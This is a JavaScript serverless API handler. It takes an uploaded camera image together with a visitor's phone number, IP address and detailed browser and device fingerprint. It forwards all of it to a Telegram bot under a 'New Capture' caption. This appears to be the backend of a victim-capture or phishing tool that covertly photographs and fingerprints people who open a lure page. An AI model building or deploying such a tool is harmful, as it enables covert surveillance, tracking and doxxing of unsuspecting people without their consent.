import fs from 'fs';
import path from 'path';

export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    const { image, phone, userAgent, platform, language, languages, screen, screenAvail, timezone, offset, cores, memory, connection, webgl, doNotTrack, referrer, viewport } = req.body;
    if (!image) return res.status(400).json({ error: 'No image received' });

    // Try environment variables first (recommended for security)
    let BOT_TOKEN = process.env.BOT_TOKEN;
    let CHAT_ID = process.env.CHAT_ID;

    // If not set, try reading from token.txt and uid.txt
    if (!BOT_TOKEN || !CHAT_ID) {
        try {
            const root = process.cwd();
            BOT_TOKEN = fs.readFileSync(path.join(root, 'token.txt'), 'utf8').trim();
            CHAT_ID = fs.readFileSync(path.join(root, 'uid.txt'), 'utf8').trim();
        } catch (e) {
            return res.status(500).json({ error: 'Missing BOT_TOKEN or CHAT_ID. Set env vars or create token.txt/uid.txt' });
        }
    }

    // Get IP
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';

    // Build caption
    const caption = `📱 **New Capture**\n` +
                    `📞 Phone: ${phone || 'N/A'}\n` +
                    `🌐 IP: ${ip}\n` +
                    `💻 UA: ${userAgent || 'N/A'}\n` +
                    `🖥️ Platform: ${platform || 'N/A'}\n` +
                    `🗣️ Language: ${language || 'N/A'}\n` +
                    `📺 Screen: ${screen || 'N/A'}\n` +
                    `🕐 Timezone: ${timezone || 'N/A'} (offset: ${offset || 'N/A'})\n` +
                    `⚙️ Cores: ${cores || 'N/A'} / Memory: ${memory || 'N/A'}\n` +
                    `📶 Connection: ${connection ? JSON.stringify(connection) : 'N/A'}\n` +
                    `🎮 WebGL: ${webgl || 'N/A'}\n` +
                    `🚫 DNT: ${doNotTrack || 'N/A'}\n` +
                    `🔗 Referrer: ${referrer || 'N/A'}\n` +
                    `👁️ Viewport: ${viewport || 'N/A'}`;

    const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
    const buffer = Buffer.from(base64Data, 'base64');

    try {
        // Use global FormData and Blob (Node 18+)
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', new Blob([buffer], { type: 'image/jpeg' }), 'capture.jpg');
        form.append('caption', caption);
        form.append('parse_mode', 'Markdown');

        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: form
        });

        const data = await response.json();
        if (!response.ok) {
            console.error('Telegram error:', data);
            return res.status(500).json({ error: `Telegram: ${data.description}` });
        }

        res.status(200).json({ status: 'ok' });
    } catch (error) {
        console.error('Server error:', error);
        res.status(500).json({ error: error.message });
    }
}
